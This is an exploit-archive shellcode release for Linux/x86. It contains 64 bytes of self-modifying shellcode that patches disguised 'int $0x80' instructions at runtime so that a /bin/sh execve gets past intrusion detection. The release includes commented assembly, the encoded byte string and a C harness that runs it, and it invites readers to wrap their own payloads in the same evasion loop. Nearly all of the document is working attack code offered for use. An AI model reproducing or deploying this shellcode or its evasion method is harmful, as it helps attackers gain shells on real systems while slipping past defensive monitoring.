/*
    _  __                 __  ___      __
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

 xenomuta\x40phreaker\x2enet
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 Description:
 linux/x86 Self-modifying ShellCode for IDS evasion
 creates int $0x80 syscalls on runtime.

 OS: Linux
 Arch: x86
 Length: 64 bytes ( 35 without /bin/sh payload )
 Author: XenoMuta

 hola at:
  str0k3, garay, fr1t0l4y, emra.
  - God bless you all -

=== SOURCE CODE ====
.globl _start
_start:
	jmp _findOut
_WhereAmI:
	pop %edx	// Save our payload's address g20
	mov %edx, %esi	// and save it 4 later
_loopMakeInt80s:
	mov (%edx), %eax
	cmpw $0x7dca, %ax	// Find this guy ( 0x7dca ) and
	jne _no
	addw $0x303, %ax	// 0x7dca + 0x303 == 0x80cd ( int $0x80 )
	mov %eax, (%edx)
_no:
	incb %dl
	cmp $0x41414141, %eax	// Use 'AAAA' as end Marker.
	jne _loopMakeInt80s
	jmp *%esi		// Jump to our converted code when done
_findOut:
	call _WhereAmI
_payload:			// Paste your shell code here and then replace
	xor %edx, %edx		// "\xcd\x80" (int $0x80) for .ascii "\xca7d"
	push $0xb		// and end with .ascii "AAAA" as end marker
	pop %eax
	cltd
	push %edx
	push $0x68732f2f
	push $0x6e69622f
	mov %esp, %ebx
	push %edx
	push %ebx
	mov %esp,%ecx
	.ascii "\xca\x7d" // + 0x303 = 0xcd80 (int $0x80)
	.ascii "AAAA"
=== SOURCE CODE ====
*/


char shellcode[] = "\xeb\x1c\x5a\x89\xd6\x8b\x02\x66\x3d\xca\x7d\x75\x06\x66\x05\x03\x03\x89\x02\xfe\xc2\x3d\x41\x41\x41\x41\x75\xe9\xff\xe6\xe8\xdf\xff\xff\xff\x31\xd2\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xca\x7d\x41\x41\x41\x41";

int main ()
{
	printf("Length: %d bytes\n", strlen(shellcode));
	int (*sc)() = (int (*)())shellcode;
	sc();
	return 0;
}

// milw0rm.com [2009-09-15]